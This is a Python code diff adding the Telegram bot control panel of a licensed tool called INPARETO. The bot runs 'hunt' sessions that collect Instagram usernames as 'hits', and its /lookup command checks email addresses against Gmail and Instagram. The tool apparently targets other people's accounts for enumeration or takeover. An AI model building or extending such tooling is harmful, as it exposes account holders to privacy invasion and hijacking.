+    if chat_id and message_id:
+        LIVE_PANEL["chat_id"] = str(chat_id)
+        LIVE_PANEL["message_id"] = message_id
+    if callback_data in LIVE_DASHBOARD_CALLBACKS:
+        LIVE_PANEL["view"] = "stats"
+    elif callback_data != "LIVE_OFF":
+        LIVE_PANEL["view"] = None
+
+
+def reset_session_stats():
+    profile_archive_session()
+    global gen, valid, hit, errors, START_TIME, last_milestone_hit
+    global _last_gen_at, _pulse_last_gen, _pulse_last_at
+    with lock:
+        gen = 0
+        valid = 0
+        hit = 0
+        errors = 0
+    with event_log_lock:
+        event_log.clear()
+    clear_session_hit_timestamps()
+    START_TIME = datetime.now(timezone.utc)
+    _init_session_hits_file()
+    _last_gen_at = time.monotonic()
+    _pulse_last_gen = 0
+    _pulse_last_at = time.monotonic()
+    with profile_lock:
+        profile = load_profile_data()
+        last_milestone_hit = max(
+            int(profile.get("last_milestone_hit") or 0),
+            int(load_profile_cache(profile.get("operator_id")).get("last_milestone_hit") or 0),
+        )
+    log_event("CONFIG", "Session stats reset remotely")
+
+
+def check_backend_health():
+    url = f"http://{ip}:{port}/ig_gen?min={MIN_FOLLOWERS}"
+    started = time.time()
+    try:
+        response = session.get(url, timeout=min(10, TIMEOUT))
+        latency_ms = int((time.time() - started) * 1000)
+        if response.ok:
+            data = response.json()
+            if data.get("username") or "info" in data:
+                return True, "ig_gen OK", latency_ms
+            return True, "ig_gen responded", latency_ms
+        return False, f"HTTP {response.status_code}", latency_ms
+    except Exception as exc:
+        latency_ms = int((time.time() - started) * 1000)
+        return False, str(exc)[:80], latency_ms
+
+
+def export_hits_archive():
+    session_path = _current_session_hits_path()
+    if session_path:
+        caption = (
+            format_panel_header()
+            + f"<b>{S['btn_export']} Session hits export</b>\n"
+            + tg_row("File", os.path.basename(session_path))
+        )
+        return send_telegram_document(session_path, caption=caption)
+    if not os.path.exists("hits.txt"):
+        return bot_command_reply(
+            format_action_notice("Export failed", "No hits saved yet this session.", "WARN"),
+            reply_markup=panel_keyboard("tools"),
+        )
+    caption = format_panel_header() + f"<b>{S['btn_export']} Hit archive export</b>"
+    return send_telegram_document("hits.txt", caption=caption)
+
+
+def maybe_send_milestone_alert():
+    """Lifetime hit milestones — persisted so they do not repeat every session."""
+    global last_milestone_hit
+    if not TELEGRAM_ENABLED:
+        return
+    milestone = None
+    with profile_lock:
+        profile = load_profile_data()
+        lifetime_hits = int(profile.get("lifetime", {}).get("total_hits") or 0)
+        marker = max(
+            int(last_milestone_hit or 0),
+            int(profile.get("last_milestone_hit") or 0),
+            int(load_profile_cache(profile.get("operator_id")).get("last_milestone_hit") or 0),
+        )
+        passed = [m for m in HIT_MILESTONES if marker < m <= lifetime_hits]
+        if not passed:
+            return
+        milestone = passed[-1]
+        if int(profile.get("last_milestone_hit") or 0) >= milestone:
+            return
+        last_milestone_hit = milestone
+        profile["last_milestone_hit"] = milestone
+        save_profile_data(profile)
+    send_telegram_text(
+        format_panel_header()
+        + f"<b>{S['brand']} Milestone</b>\n\n"
+        + tg_row("Lifetime hits", str(milestone))
+        + f"\n<b>State</b>  {tg_state_badge()}",
+    )
+
+
+def live_watch_loop():
+    while True:
+        time.sleep(LIVE_WATCH_INTERVAL)
+        if not TELEGRAM_ENABLED or not LIVE_WATCH:
+            continue
+        if LIVE_PANEL.get("view") != "stats":
+            continue
+        chat_id = LIVE_PANEL.get("chat_id")
+        message_id = LIVE_PANEL.get("message_id")
+        if not chat_id or not message_id:
+            continue
+        try:
+            update_panel_message(
+                chat_id,
+                message_id,
+                format_stats(),
+                panel_keyboard("main"),
+            )
+        except Exception as exc:
+            log_event("TG LIVE", str(exc))
+
+
+def load_startup_photo_bytes(*, force_refresh=False):
+    url = (STARTUP_PHOTO_URL or "").strip()
+    if not url:
+        return None, None
+    now = time.time()
+    if not force_refresh:
+        cached = _startup_photo_cache
+        if cached.get("bytes") and (now - cached.get("at", 0)) < STARTUP_PHOTO_CACHE_TTL:
+            return cached["bytes"], cached.get("ctype") or "image/jpeg"
+    photo, ctype = _fetch_url_with_retries(
+        url,
+        timeout=STARTUP_PHOTO_TIMEOUT,
+        retries=STARTUP_PHOTO_RETRIES,
+        delay=STARTUP_PHOTO_RETRY_DELAY,
+        label="STARTUP IMG",
+    )
+    if photo:
+        _startup_photo_cache["bytes"] = photo
+        _startup_photo_cache["ctype"] = ctype
+        _startup_photo_cache["at"] = now
+    return photo, ctype
+
+
+def preload_startup_photo_async():
+    def _run():
+        try:
+            load_startup_photo_bytes(force_refresh=True)
+        except Exception:
+            pass
+
+    threading.Thread(target=_run, daemon=True, name="startup-img").start()
+
+
+def _send_startup_photo_message(caption, kb, photo, content_type):
+    data = {
+        "chat_id": operator_reply_chat_id(),
+        "caption": caption,
+        "parse_mode": "HTML",
+        "reply_markup": json.dumps(kb),
+    }
+    data = telegram_disable_link_preview(data, "sendPhoto")
+    files = {"photo": ("inpareto_welcome.png", photo, content_type or "image/jpeg")}
+    return telegram_post_with_retries(
+        "sendPhoto",
+        data=data,
+        files=files,
+        timeout=TG_SEND_TIMEOUT,
+        max_retries=STARTUP_PHOTO_SEND_RETRIES,
+        label="STARTUP",
+    )
+
+
+def _discard_startup_loading_message(chat_id, message_id):
+    if chat_id and message_id:
+        delete_telegram_message(chat_id, message_id)
+
+
+def send_startup_panel(*, prefer_edit=False, discard_loading=None):
+    """Welcome panel with INPARETO image + caption (startup + /start)."""
+    if not TELEGRAM_ENABLED:
+        return None
+    loading_chat_id, loading_message_id = (None, None)
+    if discard_loading:
+        loading_chat_id, loading_message_id = discard_loading
+    elif not prefer_edit:
+        taken = _take_startup_loading_discard(
+            operator_reply_chat_id() or TELEGRAM_CHAT_ID
+        )
+        if taken:
+            loading_chat_id, loading_message_id = taken
+    caption = format_startup()
+    kb = panel_keyboard("main")
+    reply_cid = operator_reply_chat_id()
+
+    photo, content_type = load_startup_photo_bytes()
+    if not photo:
+        resp = send_telegram_text(caption, reply_markup=kb, chat_id=reply_cid)
+        remember_startup_panel(response=resp, has_photo=False)
+        _sync_live_panel_from_reply_markup(kb)
+        if _telegram_api_ok(resp):
+            _discard_startup_loading_message(loading_chat_id, loading_message_id)
+
+        def _photo_upgrade():
+            try:
+                p, ct = load_startup_photo_bytes(force_refresh=True)
+                if not p:
+                    return
+                r = _send_startup_photo_message(caption, kb, p, ct)
+                if r is not None:
+                    remember_startup_panel(response=r, has_photo=True)
+            except Exception as exc:
+                log_event("STARTUP", str(exc)[:80])
+
+        threading.Thread(target=_photo_upgrade, daemon=True, name="startup-img").start()
+        return resp
+
+    if photo:
+        chat_id = STARTUP_PANEL.get("chat_id") or reply_cid
+        message_id = STARTUP_PANEL.get("message_id")
+        has_photo = STARTUP_PANEL.get("has_photo")
+        if prefer_edit and has_photo and chat_id and message_id:
+            resp = edit_telegram_caption(chat_id, message_id, caption, reply_markup=kb)
+            if _telegram_api_ok(resp):
+                remember_startup_panel(chat_id, message_id, has_photo=True)
+                _sync_live_panel_from_reply_markup(kb)
+                _discard_startup_loading_message(loading_chat_id, loading_message_id)
+                return resp
+
+        if message_id and chat_id and not has_photo:
+            delete_telegram_message(chat_id, message_id)
+
+        resp = _send_startup_photo_message(caption, kb, photo, content_type)
+        if resp is None:
+            photo, content_type = load_startup_photo_bytes(force_refresh=True)
+            if photo:
+                resp = _send_startup_photo_message(caption, kb, photo, content_type)
+        if resp is not None:
+            remember_startup_panel(response=resp, has_photo=True)
+            _sync_live_panel_from_reply_markup(kb)
+            if _telegram_api_ok(resp):
+                _discard_startup_loading_message(loading_chat_id, loading_message_id)
+            return resp
+
+    if prefer_edit:
+        chat_id = STARTUP_PANEL.get("chat_id") or reply_cid
+        message_id = STARTUP_PANEL.get("message_id")
+        if chat_id and message_id and STARTUP_PANEL.get("has_photo"):
+            resp = edit_telegram_caption(chat_id, message_id, caption, reply_markup=kb)
+            if _telegram_api_ok(resp):
+                remember_startup_panel(chat_id, message_id, has_photo=True)
+                _sync_live_panel_from_reply_markup(kb)
+                if loading_message_id:
+                    _discard_startup_loading_message(loading_chat_id, loading_message_id)
+                return resp
+        if chat_id and message_id:
+            resp = edit_telegram_message(chat_id, message_id, caption, reply_markup=kb)
+            if _telegram_api_ok(resp):
+                remember_startup_panel(chat_id, message_id, has_photo=False)
+                _sync_live_panel_from_reply_markup(kb)
+                if loading_message_id:
+                    _discard_startup_loading_message(loading_chat_id, loading_message_id)
+                return resp
+    resp = send_telegram_text(caption, reply_markup=kb, chat_id=reply_cid)
+    remember_startup_panel(response=resp, has_photo=False)
+    _sync_live_panel_from_reply_markup(kb)
+    if _telegram_api_ok(resp):
+        _discard_startup_loading_message(loading_chat_id, loading_message_id)
+    return resp
+
+
+def send_startup_message():
+    if not TELEGRAM_ENABLED:
+        return
+    if reply_hit_group_required() is not None:
+        return
+    send_startup_panel(prefer_edit=False)
+
+
+def answer_callback(callback_query_id, text, show_alert=False):
+    return send_telegram_request("answerCallbackQuery", data={
+        "callback_query_id": callback_query_id,
+        "text": text,
+        "show_alert": show_alert,
+    })
+
+
+def parse_number(value, default=None, minimum=1):
+    try:
+        parsed = int(value)
+        return max(minimum, parsed)
+    except Exception:
+        return default
+
+
+ADMIN_CMD_HEADS = frozenset({
+    "/admin", "/adminhelp", "/set", "/addadmin", "/get", "/botdefaults",
+    "/rebrand", "/rebrandall", "/force", "/forcelist", "/forcedel", "/ban",
+    "/unban", "/broadcast", "/users", "/adminstats",
+    "/licensegen", "/genkey", "/grant", "/revoke", "/licenseinfo",
+    "/licenses", "/licensekeys",
+    *ADMIN_SET_LEGACY.keys(),
+})
+
+# Welcome + hunt dashboard — need hit group, not license alone.
+PANEL_COMMAND_HEADS = frozenset({
+    "/start", "start", "/stats", "stats", "/status", "status",
+    "/api", "api", "/cloud", "cloud", "/settings", "settings",
+    "/hits", "hits", "/saved", "saved", "/profile", "profile",
+    "/leaderboard", "leaderboard", "/badges", "badges",
+    "/analytics", "analytics", "/health", "health",
+    "/export", "export", "/live", "live", "/reset", "reset",
+    "/pause", "pause", "/resume", "resume",
+})
+
+
+def is_operator_tuning_command(lower):
+    return (
+        lower.startswith("/set min")
+        or lower.startswith("/set timeout")
+        or lower.startswith("/set threads")
+        or lower.startswith("/setthreads")
+    )
+
+
+def _is_check_command(command):
+    cmd = normalize_bot_command_text(command or "")
+    head = _telegram_command_head(cmd)
+    lower = cmd.strip().lower()
+    return head == "/check" or lower in {"/check", "check"} or lower.startswith("/check ")
+
+
+def cmd_operator_check(command, actor):
+    """Full health diagnostic — always available (even when hunt is locked)."""
+    parts = normalize_bot_command_text(command or "").strip().split()
+    target = str(actor or "").strip()
+    remote = False
+    if len(parts) > 1:
+        if not admin_is_admin(actor):
+            return bot_command_reply(
+                format_action_notice(
+                    "Check",
+                    "Usage: <code>/check</code> — diagnoses this device.\n"
+                    "<i>Only admins can run</i> <code>/check USER_ID</code> for remote account checks.",
+                    "INFO",
+                    detail_html=True,
+                ),
+            )
+        target = parts[1].strip().lstrip("@")
+        machine_uid = str(resolve_operator_telegram_id() or "")
+        remote = bool(target and target != machine_uid)
+    snap = collect_operator_health_checks(target, remote=remote)
+    body = format_operator_check_message(target, remote=remote)
+    return bot_command_reply(body, reply_markup=operator_check_reply_keyboard(snap))
+
+
+def process_bot_command(command, from_user_id=None):
+    command = normalize_bot_command_text(command or "")
+    actor = str(from_user_id or resolve_operator_id(TELEGRAM_CHAT_ID) or "")
+    lower = command.strip().lower()
+    head = _telegram_command_head(command)
+
+    if _is_check_command(command):
+        return cmd_operator_check(command, actor)
+
+    if (
+        actor
+        and admin_is_admin(actor)
+        and not is_operator_tuning_command(lower)
+        and (head in ADMIN_CMD_HEADS or head.startswith("/admin"))
+    ):
+        reply = admin_process_command(command.strip(), actor)
+        if reply:
+            body = reply if "<b>" in reply else format_action_notice("Admin", reply, "OK")
+            return bot_command_reply(body)
+
+    if lower.startswith("/redeem"):
+        parts = command.strip().split(maxsplit=1)
+        if len(parts) < 2:
+            return bot_command_reply(
+                format_action_notice(
+                    "Redeem",
+                    "Usage: <code>/redeem INPA-XXXX-XXXX-XXXX-XXXX</code>",
+                    "WARN",
+                    detail_html=True,
+                ),
+            )
+        ok, result = license_redeem_key(parts[1], actor)
+        if ok:
+            clear_local_free_plan()
+            sync_operator_access()
+            return bot_command_reply(
+                format_action_notice(
+                    "INPARETO Premium activated",
+                    f"Unlimited hunt access until <b>{license_format_expiry(result)}</b>.\n"
+                    "Daily generation cap removed · complete channel joins + hit group if prompted.",
+                    "OK",
+                    detail_html=True,
+                ),
+                reply_markup=panel_keyboard("notice"),
+            )
+        detail = result if isinstance(result, str) else "Redeem failed"
+        return bot_command_reply(
+            format_action_notice("Redeem failed", detail, "ERR", detail_html=True),
+        )
+
+    if lower in {"/mylicense", "mylicense", "/license", "license"}:
+        return bot_command_reply(format_my_license_message(actor))
+
+    if lower in {"/plan", "plan"}:
+        return bot_command_reply(format_plan_message(actor))
+
+    if lower in {"/verify", "verify"}:
+        admin_invalidate_access(actor)
+        invalidate_operator_gate_cache()
+        granted, state = admin_user_access_granted(actor)
+        if granted:
+            hg_ok, hg_reason = operator_hit_group_access_state(force=True)
+            sync_operator_access()
+            apply_worker_pause_state()
+            if hg_ok and not paused:
+                pause_event.set()
+            if hg_ok:
+                mark_operator_access_verified()
+                return bot_command_reply(
+                    format_action_notice(
+                        "Access verified",
+                        "Joins and hit group OK — hunting and remote control unlocked.",
+                        "OK",
+                    ),
+                    reply_markup=panel_keyboard("notice"),
+                )
+            return send_access_gate_reply()
+        if state == "banned":
+            return send_access_gate_reply()
+        if state in ("no_license", "expired", "cloud_offline", "trial_expired", "daily_limit"):
+            entitled, preason, pinfo = operator_plan_entitled(actor)
+            if entitled:
+                pass
+            else:
+                return bot_command_reply(format_operator_plan_gate(preason or state, pinfo))
+        missing = state if isinstance(state, list) else []
+        detail = str(state) if isinstance(state, str) else "Complete all joins first."
+        if missing:
+            detail = "\n".join(
+                f"· {r.get('preview_name')}: {r.get('_verify_hint', 'not joined')}"
+                for r in missing[:6]
+            )
+        return bot_command_reply(
+            format_action_notice("Still locked", detail, "WARN"),
+            reply_markup=admin_join_gate_keyboard(missing) if missing else hit_group_gate_keyboard(),
+        )
+
+    if lower in {"/logout", "logout"}:
+        return bot_command_reply(
+            format_logout_confirm(),
+            reply_markup=panel_keyboard("logout_confirm"),
+        )
+
+    if lower in {"/hitgroup", "hitgroup", "/setgroup", "setgroup"} or head in {"/hitgroup", "/setgroup"}:
+        return bot_command_reply(
+            format_hit_group_setup_message(),
+            reply_markup=hit_group_gate_keyboard(),
+        )
+    if lower in {"/verifyhitgroup", "verifyhitgroup"} or head == "/verifyhitgroup":
+        reply_cid = operator_reply_chat_id()
+        in_group = bool(operator_command_in_group() and reply_cid)
+        ok, msg = verify_operator_hit_group_access(
+            fast=True,
+            group_id=reply_cid if in_group else None,
+        )
+        if ok:
+            return bot_command_reply(
+                format_action_notice("Hit group verified", msg, "OK"),
+                reply_markup=panel_keyboard("notice"),
+            )
+        body = msg if isinstance(msg, str) and "<b>" in msg else format_hit_group_gate_message("no_hit_group")
+        return bot_command_reply(body, reply_markup=hit_group_gate_keyboard())
+
+    if lower in {"/start", "start"}:
+        schedule_sync_telegram_commands(actor or TELEGRAM_CHAT_ID)
+        refresh_terminal_license_from_cloud()
+        return send_startup_panel(prefer_edit=False)
+
+    if lower in {"/help", "help"}:
+        return bot_command_reply(format_help(), reply_markup=panel_keyboard("help"))
+
+    if TELEGRAM_ENABLED and not operator_bot_commands_allowed(actor):
+        gate = send_access_gate_reply()
+        if gate is not True:
+            return gate
+
+    if TELEGRAM_ENABLED and head in PANEL_COMMAND_HEADS:
+        hg_block = reply_hit_group_required(actor)
+        if hg_block is not None:
+            return hg_block
+
+    if lower in {"/stats", "stats"}:
+        return bot_command_reply(format_stats(), reply_markup=panel_keyboard("main"))
+    if lower in {"/status", "status"}:
+        return bot_command_reply(format_status_quick(), reply_markup=panel_keyboard("status"))
+    if lower in {"/api", "api"}:
+        return bot_command_reply(format_api_quick(), reply_markup=panel_keyboard("api"))
+    if lower in {"/cloud", "cloud"}:
+        return bot_command_reply(format_cloud_quick(), reply_markup=panel_keyboard("cloud"))
+    if lower in {"/settings", "settings"}:
+        return bot_command_reply(
+            format_settings(),
+            reply_markup=panel_keyboard("settings"),
+        )
+    if lower.startswith("/set min"):
+        parts = command.split()
+        if len(parts) < 3:
+            return bot_command_reply(
+                format_action_notice(
+                    "Usage", f"/set min {tg_code('number')}", "INFO", detail_html=True,
+                ),
+                reply_markup=panel_keyboard("settings"),
+            )
+        value = parse_number(parts[2])
+        if value is None:
+            return bot_command_reply(
+                format_action_notice("Invalid value", "Min followers must be a positive number.", "WARN"),
+                reply_markup=panel_keyboard("settings"),
+            )
+        set_min_followers(value)
+        if MIN_FOLLOWERS_FILTER_ENABLED:
+            detail = f"Now hunting accounts with ≥ {value} followers."
+        else:
+            detail = (
+                f"Saved min target {value}. Follower filter is off — "
+                "IG gen API no longer returns follower counts."
+            )
+        return bot_command_reply(
+            format_action_notice("Min target updated", detail),
+            reply_markup=panel_keyboard("settings"),
+        )
+    if lower.startswith("/set timeout"):
+        parts = command.split()
+        if len(parts) < 3:
+            return bot_command_reply(
+                format_action_notice(
+                    "Usage", f"/set timeout {tg_code('seconds')}", "INFO", detail_html=True,
+                ),
+                reply_markup=panel_keyboard("settings"),
+            )
+        value = parse_number(parts[2], minimum=1)
+        if value is None:
+            return bot_command_reply(
+                format_action_notice("Invalid value", "Timeout must be a positive number of seconds.", "WARN"),
+                reply_markup=panel_keyboard("settings"),
+            )
+        set_timeout(value)
+        return bot_command_reply(
+            format_action_notice("Timeout updated", f"Request timeout is now {value}s."),
+            reply_markup=panel_keyboard("settings"),
+        )
+    if lower.startswith("/set threads") or lower.startswith("/setthreads"):
+        parts = command.split()
+        if len(parts) < 3:
+            return bot_command_reply(
+                format_action_notice(
+                    "Usage", f"/set threads {tg_code('count')}", "INFO", detail_html=True,
+                ),
+                reply_markup=panel_keyboard("settings"),
+            )
+        value = parse_number(parts[2], minimum=1)
+        if value is None:
+            return bot_command_reply(
+                format_action_notice("Invalid value", "Thread count must be a positive integer.", "WARN"),
+                reply_markup=panel_keyboard("settings"),
+            )
+        set_thread_count(value)
+        return bot_command_reply(
+            format_action_notice("Workers updated", f"Thread pool target set to {value}."),
+            reply_markup=panel_keyboard("settings"),
+        )
+    if lower in {"/pause", "pause"}:
+        set_paused(True)
+        return bot_command_reply(
+            format_pause_resume_confirm(False),
+            reply_markup=panel_keyboard("pause_notice"),
+        )
+    if lower in {"/resume", "resume"}:
+        set_paused(False)
+        return bot_command_reply(
+            format_pause_resume_confirm(True),
+            reply_markup=panel_keyboard("pause_notice"),
+        )
+    if lower in {"/hits", "hits"}:
+        return bot_command_reply(format_hits_message(), reply_markup=panel_keyboard("hits"))
+    if lower in {"/saved", "saved"}:
+        return export_saved_favorites()
+    if lower in {"/profile", "profile"}:
+        return bot_command_reply(
+            format_profile(), reply_markup=panel_keyboard("profile"),
+        )
+    if lower in {"/leaderboard", "leaderboard"}:
+        return bot_command_reply(
+            format_operator_leaderboard(), reply_markup=panel_keyboard("leaderboard"),
+        )
+    if lower in {"/badges", "badges"}:
+        return bot_command_reply(
+            format_badges(), reply_markup=panel_keyboard("profile"),
+        )
+    if lower in {"/analytics", "analytics"}:
+        return bot_command_reply(format_analytics(), reply_markup=panel_keyboard("analytics"))
+    if lower in {"/health", "health"}:
+        return bot_command_reply(format_health(), reply_markup=panel_keyboard("health"))
+    if lower in {"/export", "export"}:
+        return export_hits_archive()
+    if lower.startswith("/live"):
+        parts = lower.split()
+        if len(parts) < 2 or parts[1] not in {"on", "off"}:
+            return bot_command_reply(
+                format_action_notice("Usage", "/live on  or  /live off", "INFO"),
+                reply_markup=panel_keyboard("tools"),
+            )
+        set_live_watch(parts[1] == "on")
+        state = "enabled" if LIVE_WATCH else "disabled"
+        return bot_command_reply(
+            format_action_notice("Live refresh", f"Auto dashboard {state}. Pin a panel & use Tools → Live for best results."),
+            reply_markup=panel_keyboard("tools"),
+        )
+    if lower in {"/reset", "reset"}:
+        return bot_command_reply(
+            format_reset_confirm(),
+            reply_markup=panel_keyboard("reset_confirm"),
+        )
+    if lower.startswith("/lookup"):
+        parts = command.strip().split(None, 2)
+        if len(parts) < 3:
+            return bot_command_reply(
+                format_action_notice(
+                    "Usage",
+                    "/lookup gmail user@gmail.com\n/lookup insta user@gmail.com",
+                    "INFO",
+                ),
+                remove_markup=True,
+            )
+        kind = parts[1].lower()
+        email = normalize_lookup_email(parts[2])
+        if not email:
+            return bot_command_reply(
+                format_action_notice("Invalid email", "Use a full email address.", "WARN"),
+                remove_markup=True,
+            )
+        if kind in {"gmail", "g"}:
+            body = cmd_lookup_gmail(email)
+        elif kind in {"insta", "ig", "instagram"}:
+            body = cmd_lookup_insta(email)
+        else:
+            return bot_command_reply(
+                format_action_notice(
+                    "Unknown lookup",
+                    f"Use {tg_code('gmail')} or {tg_code('insta')}.",
+                    "WARN",
+                ),
+                remove_markup=True,
+            )
+        return bot_command_reply(body, remove_markup=True)
+    if lower.startswith("/gen"):
+        parts = command.strip().split()
+        if len(parts) < 3:
+            return bot_command_reply(
+                format_action_notice(
+                    "Usage",
+                    f"/gen COUNT MIN_FOLLOWERS (max {GEN_CMD_MAX_COUNT} · min ≤{GEN_CMD_MAX_MIN})",
+                    "INFO",
+                ),
+                remove_markup=True,
+            )
+        count = parse_number(parts[1], minimum=1)
+        min_val = parse_number(parts[2], minimum=1)
+        if count is None or min_val is None:
+            return bot_command_reply(
+                format_action_notice("Invalid values", "COUNT and MIN must be positive numbers.", "WARN"),
+                remove_markup=True,
+            )
+        if count > GEN_CMD_MAX_COUNT:
+            return bot_command_reply(
+                format_action_notice(
+                    "Limit",
+                    f"Max {GEN_CMD_MAX_COUNT} usernames per /gen command.",
+                    "WARN",
+                ),
+                remove_markup=True,
+            )
+        if min_val > GEN_CMD_MAX_MIN:
+            return bot_command_reply(
+                format_action_notice(
+                    "Limit",
+                    f"Max minimum followers is {GEN_CMD_MAX_MIN}.",
+                    "WARN",
+                ),
+                remove_markup=True,
+            )
+        return bot_command_reply(cmd_generate_batch(count, min_val), remove_markup=True)
+    return bot_command_reply(
+        format_action_notice("Unknown command", "Send /stats for the dashboard or /help for commands.", "ERR"),
+        reply_markup=panel_keyboard("notice"),
+    )
+
+
+def handle_telegram_update(update):
+    global LEADERBOARD_MODE
+    if "my_chat_member" in update:
+        threading.Thread(
+            target=handle_operator_my_chat_member,
+            args=(update,),
+            daemon=True,
+            name="tg-mcm",
+        ).start()
+        return
+    actor = telegram_actor_id(update)
+    if "callback_query" in update:
+        callback = update["callback_query"]
+        cb_msg = callback.get("message") or {}
+        cb_chat = cb_msg.get("chat") or {}
+        cb_chat_id = str(cb_chat.get("id", ""))
+        cb_chat_type = cb_chat.get("type", "private")
+        if not can_control_operator_bot(actor):
+            if cb_chat_type in ("group", "supergroup"):
+                answer_callback(
+                    callback.get("id"),
+                    "Only the linked operator or admin can use this bot.",
+                    show_alert=True,
+                )
+            return
+        if cb_chat_type == "private" and str(actor) != str(cb_chat_id):
+            return
+        callback_data = callback.get("data", "")
+        if callback_data in ("REFRESH", "HOME"):
+            callback_data = "STATS"
+        main_kb = panel_keyboard("main")
+        update_live_panel_tracking(callback, callback_data)
+
+        if callback_data == "VERIFY_HITGROUP":
+            answer_callback(callback.get("id"), "Verifying hit group…", show_alert=False)
+
+        if callback_data == "VERIFY_JOIN":
+            answer_callback(callback.get("id"), "Checking access…", show_alert=False)
+            paid_ok, paid_reason, paid_exp = paid_access_status(actor)
+            entitled, plan_reason, plan_info = operator_plan_entitled(actor)
+            if not entitled and not admin_is_admin(actor):
+                edit_panel_from_callback(
+                    callback,
+                    format_operator_plan_gate(plan_reason or paid_reason or "no_license", plan_info, paid_exp),
+                    main_kb,
+                    toast="Plan required",
+                    show_alert=True,
+                )
+                return
+            if not plan_can_hunt(actor)[0] and not admin_is_admin(actor):
+                _, hunt_reason, hunt_info = plan_can_hunt(actor)
+                if hunt_reason == "daily_limit":
+                    edit_panel_from_callback(
+                        callback,
+                        format_operator_plan_gate("daily_limit", hunt_info),
+                        main_kb,
+                        toast="Daily limit reached",
+                        show_alert=True,
+                    )
+                    return
+            admin_invalidate_access(actor)
+            invalidate_operator_gate_cache()
+            granted, state = admin_user_access_granted(actor)
+            if granted:
+                hg_ok, _ = operator_hit_group_access_state(force=True)
+                sync_operator_access()
+                apply_worker_pause_state()
+                if hg_ok and not paused:
+                    pause_event.set()
+                if hg_ok:
+                    mark_operator_access_verified()
+                    detail = (
+                        "All channels verified — hunting and remote control are unlocked."
+                    )
+                    toast = "Access unlocked"
+                    edit_panel_from_callback(
+                        callback,
+                        format_action_notice("Verified", detail, "OK"),
+                        panel_keyboard("main"),
+                        toast=toast,
+                        show_alert=True,
+                    )
+                else:
+                    detail = "Joins OK. Next: link your hit group (bot must be admin)."
+                    text, kb = admin_gate_reply_for_user(actor)
+                    edit_panel_from_callback(
+                        callback,
+                        text or format_action_notice("Hit group required", detail, "WARN"),
+                        kb or hit_group_gate_keyboard(),
+                        toast="Link hit group",
+                        show_alert=True,
+                    )
+            else:
+                missing = state if isinstance(state, list) else []
+                detail = "Join all channels, then verify again."
+                if missing:
+                    names = ", ".join(
+                        f"{r.get('preview_name')} ({r.get('_verify_hint', 'pending')})"
+                        for r in missing[:4]
+                    )
+                    detail = f"Still missing: {names}"
+                text, kb = admin_gate_reply_for_user(actor)
+                edit_panel_from_callback(
+                    callback,
+                    text or format_action_notice("Still locked", detail, "WARN"),
+                    kb or main_kb,
+                    toast="Missing joins",
+                    show_alert=True,
+                )
+            return
+
+        if callback_data == "VERIFY_HITGROUP":
+            _chat_id, message_id, _msg = panel_message_from_callback(callback)
+            ok, msg = verify_operator_hit_group_access(
+                keep_message_id=message_id,
+                fast=True,
+            )
+            if ok:
+                edit_panel_from_callback(
+                    callback,
+                    format_action_notice("Hit group ready", msg, "OK"),
+                    panel_keyboard("notice"),
+                    toast="Hit group verified",
+                    show_alert=True,
+                )
+            else:
+                body = msg if isinstance(msg, str) and "<b>" in msg else format_hit_group_gate_message("not_admin")
+                _, kb = admin_gate_reply_for_user(actor)
+                edit_panel_from_callback(
+                    callback,
+                    body,
+                    kb or hit_group_gate_keyboard(),
+                    toast="Promote bot to admin",
+                    show_alert=True,
+                )
+            return
+
+        if callback_data.startswith("FAVNOTE_YES:"):
+            uname = callback_data[12:].strip().lstrip("@")
+            set_fav_note_pending(uname)
+            answer_callback(callback.get("id"), "Send your note in bot DM")
+            send_telegram_text(
+                format_panel_header()
+                + f"<b>Note for @{html.escape(uname)}</b>\n\n"
+                + "Type your note in this chat (max 500 characters).\n"
+                + "Send <code>/cancel</code> to skip.",
+            )
+            return
+
+        if callback_data.startswith("FAVNOTE_NO:"):
+            uname = callback_data[11:].strip().lstrip("@")
+            clear_fav_note_pending()
+            answer_callback(
+                callback.get("id"),
+                f"@{uname} saved without note",
+                show_alert=False,
+            )
+            return
+
+        if callback_data.startswith("FAV:"):
+            uname = callback_data[4:].strip().lstrip("@")
+            added, count = toggle_favorite_username(uname)
+            label = "★ Saved to favorites" if added else "Removed from favorites"
+            answer_callback(
+                callback.get("id"),
+                f"{label} · {count} total",
+                show_alert=False,
+            )
+            if added:
+                send_favorite_note_prompt(uname)
+            return
+
+        if TELEGRAM_ENABLED and not operator_bot_commands_allowed(actor):
+            text, kb = admin_gate_reply_for_user(actor)
+            if not text:
+                pass
+            else:
+                edit_panel_from_callback(
+                    callback,
+                    text or admin_format_gate_message(),
+                    kb or main_kb,
+                    toast="Complete setup first",
+                    show_alert=True,
+                )
+                return
+
+        if callback_data == "STATS":
+            edit_panel_from_callback(
+                callback, format_stats(), main_kb, toast="Stats updated",
+            )
+        elif callback_data == "CMD_STATUS":
+            edit_panel_from_callback(
+                callback, format_status_quick(), panel_keyboard("status"), toast="Status",
+            )
+        elif callback_data == "CMD_API":
+            edit_panel_from_callback(
+                callback, format_api_quick(), panel_keyboard("api"), toast="API probe",
+            )
+        elif callback_data == "CMD_CLOUD":
+            edit_panel_from_callback(
+                callback, format_cloud_quick(), panel_keyboard("cloud"), toast="Cloud",
+            )
+        elif callback_data == "PAUSE":
+            set_paused(True)
+            edit_panel_from_callback(
+                callback,
+                format_pause_resume_confirm(False),
+                panel_keyboard("pause_notice"),
+                toast="Paused · workers idle",
+                show_alert=True,
+            )
+        elif callback_data == "RESUME":
+            set_paused(False)
+            access_ok = (
+                not is_locally_logged_out()
+                and operator_access_ok(actor_id=actor, force=True)
+            )
+            actually_resumed = access_ok and not _api_auto_paused and pause_event.is_set()
+            edit_panel_from_callback(
+                callback,
+                format_pause_resume_confirm(True),
+                panel_keyboard("pause_notice") if access_ok else main_kb,
+                toast=(
+                    "Resumed"
+                    if actually_resumed
+                    else ("API offline — start endpoint.py" if _api_auto_paused else "Complete access gate first")
+                ),
+                show_alert=True,
+            )
+        elif callback_data == "HITS":
+            edit_panel_from_callback(
+                callback,
+                format_hits_message(),
+                panel_keyboard("hits"),
+                toast="Captures loaded"
+                + (" · live paused" if LIVE_WATCH else ""),
+            )
+        elif callback_data == "HELP":
+            edit_panel_from_callback(
+                callback,
+                format_help(),
+                panel_keyboard("help"),
+                toast="Commands",
+            )
+        elif callback_data == "SETTINGS":
+            edit_panel_from_callback(
+                callback,
+                format_settings(),
+                panel_keyboard("settings"),
+                toast="Config" + (" · auto-refresh paused" if LIVE_WATCH else ""),
+            )
+        elif callback_data == "PROFILE":
+            edit_panel_from_callback(
+                callback,
+                format_profile(),
+                panel_keyboard("profile"),
+                toast="Profile",
+            )
+        elif callback_data == "LEADERBOARD":
